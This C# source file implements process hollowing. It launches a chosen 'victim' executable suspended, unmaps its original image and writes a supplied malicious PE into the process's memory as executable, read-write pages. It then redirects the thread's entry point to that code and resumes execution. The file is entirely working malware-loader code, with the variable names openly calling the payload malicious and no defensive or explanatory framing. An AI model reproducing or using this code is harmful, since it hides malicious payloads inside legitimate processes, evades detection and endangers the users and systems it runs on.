using System;
using System.Runtime.InteropServices;
using static Hollow.Memoryapi;
using static Hollow.Ntifs;
using static Hollow.PEParser;
using static Hollow.Processthreadsapi;
using static Hollow.Types;
using static Hollow.Wdm;
using static Hollow.Winnt;
using static Hollow.Winternl;

namespace Hollow
{
    public class ProcessHollow
    {
        private static uint CopyHeaderAndSections(
            IntPtr FilePointer,
            IntPtr AllocatedRegion,
            IntPtr Process_handle,
            int elfanew,
            byte[] FileBytes
         )
        {
            uint sizeOfMalHeaders = (uint)Marshal.ReadInt32(FilePointer, elfanew + 0x54);
            uint lpNumberOfBytesWritten = 0;
            uint nt_status = NtWriteVirtualMemory(
                Process_handle,
                AllocatedRegion,
                FilePointer,
                sizeOfMalHeaders,
                ref lpNumberOfBytesWritten
            );

            (IMAGE_DOS_HEADER IDH,
            IMAGE_NT_HEADER64 INH,
            IMAGE_FILE_HEADER IFH,
            IntPtr ISH_address) = PEHeaders(FilePointer);

            IMAGE_SECTION_HEADER ISH = new IMAGE_SECTION_HEADER();

            Console.WriteLine("[+] Copy Headers and Sections");
            Console.WriteLine($"[+] Number of sections: {IFH.NumberOfSections}");
            for (int count = 0; count < IFH.NumberOfSections; count++)
            {
                ISH = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(
                    ISH_address + count * Marshal.SizeOf(ISH),
                    typeof(IMAGE_SECTION_HEADER));

                Console.WriteLine($"\tSection: {ISH.SectionName}");

                UInt64 virtualAddress = ISH.VirtualAddress;
                Console.WriteLine($"\t\t≈====►Virtual Address: 0x{virtualAddress:X2}");

                UInt64 sizeOfRawData = ISH.SizeOfRawData;
                Console.WriteLine($"\t\t≈====►Size of Raw Data: 0x{sizeOfRawData:X2}");

                UInt64 pointerToRawData = ISH.PointerToRawData;
                Console.WriteLine($"\t\t≈====►Pointer to Raw Data: 0x{pointerToRawData:X2}\n");

                UInt64 Allocate_address = (UInt64)AllocatedRegion + virtualAddress;
                UInt64 Allocate_offset = (UInt64)FilePointer + pointerToRawData;

                byte[] bRawData = new byte[sizeOfRawData];
                Buffer.BlockCopy(FileBytes, (int)pointerToRawData, bRawData, 0, bRawData.Length);

                nt_status = NtWriteVirtualMemory(
                    Process_handle,
                    (IntPtr)Allocate_address,
                    Marshal.UnsafeAddrOfPinnedArrayElement(bRawData, 0),
                    (uint)bRawData.Length,
                    ref lpNumberOfBytesWritten
                );

                if (nt_status != 0)
                {
                    Console.WriteLine($"[X] Copy of Section \"{ISH.SectionName}\" failed to do");
                }
            }

            return nt_status;
        }
        public void Hollowing(string victimProcessPath, byte[] maliciousBytes)
        {
            STARTUPINFOA si = new STARTUPINFOA();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();

            bool status = CreateProcessA(
                null,
                victimProcessPath,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CreateProcessFlags.CREATE_SUSPENDED | CreateProcessFlags.CREATE_NEW_CONSOLE,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );

            if (!status)
            {
                Console.WriteLine("[!] Failed to created the process");
                return;
            }
            Console.WriteLine("[+] Successfully created the process");
            Console.WriteLine($"\t\\___[*] Process Id: {pi.dwProcessId}");
            Console.WriteLine($"\t\\___[*] Thread Id: {pi.dwThreadId}");

            IntPtr VictimThread_handle = pi.hThread;
            IntPtr VictimProcess_handle = pi.hProcess;

            uint tmp = 0;
            ZwQueryInformationProcess(
                VictimProcess_handle,
                0,
                ref pbi,
                (uint)IntPtr.Size * 6,
                ref tmp
            );
            CONTEXT64 VictimThread_context = new CONTEXT64()
            {
                ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL
            };
            IntPtr VictimThreadContext_address = Marshal.AllocHGlobal(Marshal.SizeOf(VictimThread_context));
            Marshal.StructureToPtr(VictimThread_context, VictimThreadContext_address, false);

            GetThreadContext(VictimThread_handle, VictimThreadContext_address);
            CONTEXT64 VictimThreadContext_get = (CONTEXT64)Marshal.PtrToStructure(VictimThreadContext_address, typeof(CONTEXT64));
            UInt64 PEB_rdx_address = VictimThreadContext_get.Rdx;
            UInt64 ImageBase_Pointer_address = PEB_rdx_address + 16;
            Console.WriteLine("\t\\___[*] ImageBase Address: 0x{0}", ImageBase_Pointer_address.ToString("X"));

            IntPtr ImageBase_address = Marshal.AllocHGlobal(8);
            RtlZeroMemory(ImageBase_address, 8);

            uint nt_status = 0xffffff;
            uint outsize = 0;
            nt_status = NtReadVirtualMemory(
                VictimProcess_handle,
                (IntPtr)ImageBase_Pointer_address,
                ImageBase_address,
                (uint)Marshal.SizeOf(ImageBase_address),
                ref outsize
            );

            IntPtr ImageBase_address_read = Marshal.ReadIntPtr(ImageBase_address);
            nt_status = ZwUnmapViewOfSection(VictimProcess_handle, ImageBase_address_read);

            IntPtr MaliciousFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(maliciousBytes, 0);
            int Malicious_elfanew = Marshal.ReadInt32(MaliciousFilePointer, IMAGE_DOS_HEADER_E_LFANEW);
            long Malicious_ImageBase = Marshal.ReadInt64(MaliciousFilePointer, Malicious_elfanew + 0x30);
            uint SizeOfMaliciousImage = (uint)Marshal.ReadInt32(MaliciousFilePointer, Malicious_elfanew + 0x50);

            IntPtr AllocatedRegion = VirtualAllocEx(
                   VictimProcess_handle,
                   (IntPtr)Malicious_ImageBase,
                   SizeOfMaliciousImage,
                   AllocationType.Reserve | AllocationType.Commit,
                   AllocationProtect.PAGE_EXECUTE_READWRITE
            );

            nt_status = CopyHeaderAndSections(
                    MaliciousFilePointer,
                    AllocatedRegion,
                    VictimProcess_handle,
                    Malicious_elfanew,
                    maliciousBytes
            );

            byte[] bImageBase = BitConverter.GetBytes((long)Malicious_ImageBase);
            uint lpNumberOfBytesWritten = 0; ;

            nt_status = NtWriteVirtualMemory(
                VictimProcess_handle,
                (IntPtr)ImageBase_Pointer_address,
                Marshal.UnsafeAddrOfPinnedArrayElement(bImageBase, 0),
                (uint)Marshal.SizeOf(Malicious_ImageBase),
                 ref lpNumberOfBytesWritten
            );

            Console.WriteLine($"[*] ImageBase 0x{Malicious_ImageBase:X2}");

            UInt32 MalEntryPointRVA = (UInt32)Marshal.ReadInt32(MaliciousFilePointer, Malicious_elfanew + 0x28);
            VictimThreadContext_get.Rcx = (ulong)AllocatedRegion + (ulong)MalEntryPointRVA;
            Marshal.StructureToPtr(VictimThreadContext_get, VictimThreadContext_address, true);
            SetThreadContext(VictimThread_handle, VictimThreadContext_address);
            Console.WriteLine("[*] Set Thread Context");
            ResumeThread(VictimThread_handle);
            Console.WriteLine("[*] Resume Thread");
        }
    }
}
